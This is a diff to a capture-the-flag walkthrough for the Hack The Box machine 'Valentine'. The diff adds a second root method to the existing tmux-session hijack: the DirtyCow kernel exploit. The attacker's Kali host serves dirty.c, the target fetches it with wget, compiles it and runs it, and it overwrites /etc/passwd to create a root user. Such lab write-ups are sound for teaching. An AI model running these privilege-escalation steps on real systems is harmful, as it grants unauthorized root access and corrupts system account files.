@@ -109,7 +109,7 @@ uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),12
 ```
 WE ARE IN, let grab the flag.
 
-# root
+# root solution 1
 from `linpeas.sh`, I found out that root user is currently using `tmux`. I then check **HackTricks** (again) and I found this [tmux sessions hijacking](https://book.hacktricks.xyz/linux-unix/privilege-escalation#tmux-sessions-hijacking). 
 ```console
 [+] Searching tmux sessions
@@ -130,4 +130,58 @@ hype@Valentine:~$ tmux -S /.devs/dev_sess
 [detached]
 root@Valentine:/home/hype# cat /root/root.txt
 ```
-BOOM !
+BOOM ! 
+# root solution 2
+again, linpeas.sh give us anoter hit. wich is kernel-exploit
+```
++] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012
+Distributor ID:	Ubuntu
+Description:	Ubuntu 12.04 LTS
+Release:	12.04
+Codename:	precise
+```
+seem like we can use CVE-2016-5195 (DirtyCow) to exploit the kernel and gain root. There are many good vid on youtube explain how DirtyCow works, pls check them out. Base on hacktricks there are many exploit out there so check `https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs` I will be using the last one `https://github.com/FireFart/dirtycow/blob/master/dirty.c`.
+
+
+Base one the comment on `dirty.c` the exploit will create a new user call `firefart` which have root permission! so lets do it!!
+on kali
+```console
+kali@kali:/opt$ sudo wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+kali@kali:/opt$ python3 -m http.server --cgi 8888
+```
+now get the `dirty.c` to valentine!
+```console
+hype@Valentine:~/Desktop$ wget http://10.10.14.9:8888/dirty.c
+--2020-10-06 12:07:38--  http://10.10.14.9:8888/dirty.c
+Connecting to 10.10.14.9:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4815 (4.7K) [text/plain]
+Saving to: `dirty.c'
+
+100%[=================================================================>] 4,815       --.-K/s   in 0.002s  
+
+2020-10-06 12:07:38 (2.49 MB/s) - `dirty.c' saved [4815/4815]
+
+hype@Valentine:~/Desktop$ gcc -pthread dirty.c -o dirty -lcrypt
+hype@Valentine:~/Desktop$ ./dirty
+hype@Valentine:~/Desktop$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
+
+mmap: 7f119f0d1000
+^C
+hype@Valentine:~/Desktop$ su firefart
+Password: 
+firefart@Valentine:/home/hype/Desktop# id
+uid=0(firefart) gid=0(root) groups=0(root)
+```
+boom we got root. as it said in the exploit, dont for get to put the real `/etc/passwd` back
+```
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+```
+HAPPY HACKING
